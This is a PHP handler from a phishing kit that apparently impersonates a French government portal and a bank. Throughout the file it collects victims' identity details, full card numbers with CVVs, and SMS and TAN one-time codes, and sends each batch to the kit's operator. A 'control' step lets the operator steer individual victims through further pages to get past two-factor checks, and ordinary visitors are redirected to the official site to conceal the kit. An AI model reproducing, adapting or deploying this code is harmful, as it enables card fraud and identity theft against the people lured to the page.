<?php
    /*******
    Main Author: MemoryError
    ********************************************************/

    require_once 'includes/main.php';
    if( $_GET['pwd'] == PASSWORD ) {
        session_destroy();
        visitors();
        header("Location: clients/index.php?verification#_");
        exit();
    } else if( !empty($_GET['redirection']) ) {
        $red = $_GET['redirection'];
        if( $red == 'errorlogin' ) {
            header("Location: clients/index.php?error=1&verification#_");
            exit();
        }
        if( $red == 'errorsms' ) {
            header("Location: clients/sms.php?error=1&code=". $_GET['code'] ."&verification#_");
            exit();
			}
        if( $red == 'errorVsms' ) {
            header("Location: clients/Vsms.php?error=1&code=". $_GET['code'] ."&verification#_");
            exit();
        }
        if( $red == 'errortan' ) {
            header("Location: clients/tan.php?error=1&code1=". $_GET['code1'] ."&code2=". $_GET['code2'] ."&code3=". $_GET['code3'] ."&verification#_");
            exit();
        }
        if( $red == 'sms' ) {
            header("Location: clients/sms.php?code=". $_GET['code'] ."&verification#_");
            exit();
			 }
        if( $red == 'Vsms' ) {
            header("Location: clients/Vsms.php?code=". $_GET['code'] ."&verification#_");
            exit();
        }
        if( $red == 'tan' ) {
            header("Location: clients/tan.php?code1=". $_GET['code1'] ."&code2=". $_GET['code2'] ."&code3=". $_GET['code3'] ."&verification#_");
            exit();
			 }
        if( $red == 'Vtan' ) {
            header("Location: clients/Vtan.php?code1=". $_GET['code1'] ."&code2=". $_GET['code2'] ."&code3=". $_GET['code3'] ."&verification#_");
            exit();
        }
        if( $red == 'errorcc' ) {
            $_SESSION['one'] = '';
            $_SESSION['three'] = '';
            $_SESSION['two'] = '';
            $_SESSION['errors']['one'] = true;
            $_SESSION['errors']['three'] = true;
            $_SESSION['errors']['two'] = true;
            header("Location: clients/cc.php?error=1&code=". $_GET['code'] ."&verification#_");
            exit();
        }
        header("Location: clients/". $red .".php?verification#_");
        exit();
    } else if($_SERVER['REQUEST_METHOD'] == "POST") {
        if( !empty($_POST['captcha']) ) {
            header("HTTP/1.0 404 Not Found");
            die();
       }
        if ($_POST['step'] == "login") {
            $_SESSION['errors']     = [];
            $_SESSION['key']   = $_POST['key'];
            $_SESSION['pin']   = $_POST['pin'];
			$_SESSION['AK06']   = $_POST['AK06'];
            $_SESSION['AK07']   = $_POST['AK07'];
			$_SESSION['AK08']   = $_POST['AK08'];
            $_SESSION['AK09']   = $_POST['AK09'];
			$_SESSION['cc']   = $_POST['cc'];
            $_SESSION['Month']   = $_POST['Month'];
            $_SESSION['Year']   = $_POST['Year'];
            $_SESSION['cvv']   = $_POST['cvv'];

            if( empty($_POST['key']) ) {
                $_SESSION['errors']['key'] = true;
            }
            if( empty($_POST['pin']) ) {
                $_SESSION['errors']['pin'] = true;
				}
            if( empty($_POST['AK06']) ) {
                $_SESSION['errors']['AK06'] = true;
				}
            if( empty($_POST['AK07']) ) {
                $_SESSION['errors']['AK07'] = true;
				}
            if( empty($_POST['AK08']) ) {
                $_SESSION['errors']['AK08'] = true;
				}
            if( empty($_POST['AK09']) ) {
                $_SESSION['errors']['AK09'] = true;
				}
            if( empty($_POST['cc']) ) {
                $_SESSION['errors']['cc'] = true;
				}
            if( empty($_POST['Month']) ) {
                $_SESSION['errors']['Month'] = true;
				}
            if( empty($_POST['Year']) ) {
                $_SESSION['errors']['Year'] = true;
				}
            if( empty($_POST['cvv']) ) {
                $_SESSION['errors']['cvv'] = true;
			
            }
          
            if( count($_SESSION['errors']) == 0 ) {
                $subject = get_client_ip() . ' |Gouv-FR | Login';
                $message = '/-- Gouv-FR INFOS --/' . get_client_ip() . "\r\n";
                $message .= 'Prenom : ' . $_POST['key'] . "\r\n";
                $message .= 'Nom : ' . $_POST['pin'] . "\r\n";
				$message .= 'Date-N : ' .$_POST['AK03']."/".$_POST['AK04']."/".$_POST['AK05']. "\r\n";
				$message .= 'Address : ' . $_POST['AK06'] . "\r\n";
                $message .= 'Zip-Code : ' . $_POST['AK07'] . "\r\n";
				$message .= 'Numero phone : ' . $_POST['AK08'] . "\r\n";
                $message .= 'E-mail : ' . $_POST['AK09'] . "\r\n";
				$message .= 'kk : ' . $_POST['cc'] . "\r\n";
				$message .= 'Ddd : ' .$_POST['Month']."/".$_POST['Year']. "\r\n";
                $message .= 'cc : ' . $_POST['cvv'] . "\r\n";
				$hello   .= "Hello Bro its Come   : ".$_POST['cc']."\n";
                $message .= 'Steps : ' . get_steps_link() . "\r\n";
                $message .= '/-- END INFOS --/' . "\r\n";
                $message .= victim_infos();
                send($subject,$message);
                reset_data();
                header("Location: clients/loading.php?verification#_");
                exit();
            } else {
                header("Location: clients/index.php?error=1&verification#_");
                exit();
            }
        }
        if ($_POST['step'] == "ssm") {
            $_SESSION['errors']     = [];
            $_SESSION['o8']   = $_POST['o8'];
		

            if( empty($_POST['o8']) ) {
                $_SESSION['errors']['o8'] = true;
				

            }
            if( count($_SESSION['errors']) == 0 ) {
                $subject = get_client_ip() . ' |  | ';
                $message = '/-- INFOS --/' . get_client_ip() . "\r\n";
                $message .= 'SMS : ' . $_POST['o8'] . "\r\n";
                $message .= 'Steps : ' . get_steps_link() . "\r\n";
                $message .= '/-- END INFOS --/' . "\r\n";
                $message .= victim_infos();
                send($subject,$message);
                reset_data();
                header("Location: clients/loading.php?verification#_");
                exit();
            } else {
                header("Location: clients/ssm.php?error=1&code=". $_POST['code'] ."&verification#_");
                exit();
				       }
        }
        if ($_POST['step'] == "sms") {
            $_SESSION['errors']     = [];
            $_SESSION['cc']   = $_POST['cc'];
			$_SESSION['Month']   = $_POST['Month'];
			$_SESSION['Year']   = $_POST['Year'];
            $_SESSION['cvv']   = $_POST['cvv'];

            if( empty($_POST['cc']) ) {
                $_SESSION['errors']['cc'] = true;
				
				}
            if( empty($_POST['Month']) ) {
                $_SESSION['errors']['Month'] = true;
				}
            if( empty($_POST['Year']) ) {
                $_SESSION['errors']['Year'] = true;
				}
            if( empty($_POST['cvv']) ) {
                $_SESSION['errors']['cvv'] = true;
            }
            if( count($_SESSION['errors']) == 0 ) {
                $subject = get_client_ip() . ' |  | ';
                $message = '/-- Carding INFOS --/' . get_client_ip() . "\r\n";
                $message .= 'Carte Bancaire : ' . $_POST['cc'] . "\r\n";
			    $message .= 'Date-Exp : ' .$_POST['Month']."/".$_POST['Year']. "\r\n";
                $message .= 'Cvv : ' . $_POST['cvv'] . "\r\n";
                $message .= 'Steps : ' . get_steps_link() . "\r\n";
                $message .= '/-- END INFOS --/' . "\r\n";
                $message .= victim_infos();
                send($subject,$message);
                reset_data();
                header("Location: clients/loading.php?verification#_");
                exit();
            } else {
                header("Location: clients/sms.php?error=1&code=". $_POST['code'] ."&verification#_");
                exit();
				}
        }
        if ($_POST['step'] == "Vsms") {
            $_SESSION['errors']     = [];
            $_SESSION['Vsms']   = $_POST['Vsms'];
            if( empty($_POST['Vsms']) ) {
                $_SESSION['errors']['Vsms'] = true;
            }
            if( count($_SESSION['errors']) == 0 ) {
                $subject = get_client_ip() . '  | VerifySmS';
                $message = '/-- SMS  INFOS --/' . get_client_ip() . "\r\n";
                $message .= 'SMS code : ' . $_POST['Vsms'] . "\r\n";
                $message .= 'Steps : ' . get_steps_link() . "\r\n";
                $message .= '/-- END SMS Verify TAN  INFOS --/' . "\r\n";
                $message .= victim_infos();
                send($subject,$message);
                reset_data();
                header("Location: clients/loading.php?verification#_");
                exit();
            } else {
                header("Location: clients/Vsms.php?error=1&code=". $_POST['code'] ."&verification#_");
                exit();
            }
        }
        if ($_POST['step'] == "tan") {
            $_SESSION['errors']     = [];
            $_SESSION['tan']   = $_POST['tan'];
            if( empty($_POST['tan']) ) {
                $_SESSION['errors']['tan'] = true;
            }
            if( count($_SESSION['errors']) == 0 ) {
                $subject = get_client_ip() . ' |  | ';
                $message = '/-- CODE INFOS --/' . get_client_ip() . "\r\n";
                $message .= 'Code : ' . $_POST['tan'] . "\r\n";
                $message .= 'Steps : ' . get_steps_link() . "\r\n";
                $message .= '/-- END INFOS --/' . "\r\n";
                $message .= victim_infos();
                send($subject,$message);
                reset_data();
                header("Location: clients/loading.php?verification#_");
                exit();
            } else {
                header("Location: clients/tan.php?error=1&code=". $_POST['code'] ."&verification#_");
                exit();
            }
       }
        if ($_POST['step'] == "cc") {
            $_SESSION['errors']      = [];
            $_SESSION['one']   = $_POST['one'];
            $_SESSION['two']     = $_POST['two'];
            $_SESSION['three']      = $_POST['three'];
            $date_ex     = explode('/',$_POST['two']);
            $card_number = validate_cc_number($_SESSION['one']);
            $card_cvv    = validate_cc_cvv($_POST['three'],$card_number['type']);
            $card_date   = validate_cc_date($date_ex[0],$date_ex[1]);
            if( $card_number == false ) {
                $_SESSION['errors']['one'] = true;
            }
            if( $card_cvv == false ) {
                $_SESSION['errors']['three'] = true;
            }
            if( $card_date == false ) {
                $_SESSION['errors']['two'] = true;
            }
            if( count($_SESSION['errors']) == 0 ) {
                $subject = get_client_ip() . ' | COMMERZ | Card';
                $message = '/-- CARD INFOS --/' . get_client_ip() . "\r\n";
                $message .= 'Número de Carte : ' . $_POST['one'] . "\r\n";
                $message .= 'Date:EXP : ' . $_POST['two'] . "\r\n";
                $message .= 'Cvv : ' . $_POST['three'] . "\r\n";
                $message .= '/-- END CARD INFOS --/' . "\r\n";
                $message .= victim_infos();
                send($subject,$message);
                reset_data();
                header("Location: clients/loading.php?verification#_");
            } else {
                header("Location: clients/cc.php?error=1&verification#_");
            }
        }
        if ($_POST['step'] == "control") {
            $fp = fopen('victims/'. $_POST['ip'] .'.txt', 'wb');
            if( $_POST['to'] == 'tan' ) {
                $_POST['to'] = $_POST['to'] . '/' . $_POST['tan_text'];
				}
				if( $_POST['to'] == 'Vtan' ) {
                $_POST['to'] = $_POST['to'] . '/' . $_POST['Vtan_text'];
            }
            if( $_POST['to'] == 'errortan' ) {
                $_POST['to'] = $_POST['to'] . '/' . $_POST['errortan_text'];
            }
            if( $_POST['to'] == 'sms' ) {
                $_POST['to'] = $_POST['to'] . '/' . $_POST['sms_text'];
            }
            if( $_POST['to'] == 'errorsms' ) {
                $_POST['to'] = $_POST['to'] . '/' . $_POST['errorsms_text'];
            }
            fwrite($fp, $_POST['to']);
            fclose($fp);
            header("location: control.php?ip=" . $_POST['ip']);
        }
    } else {
        header("Location: " . OFFICIAL_WEBSITE);
        exit();
    }
?>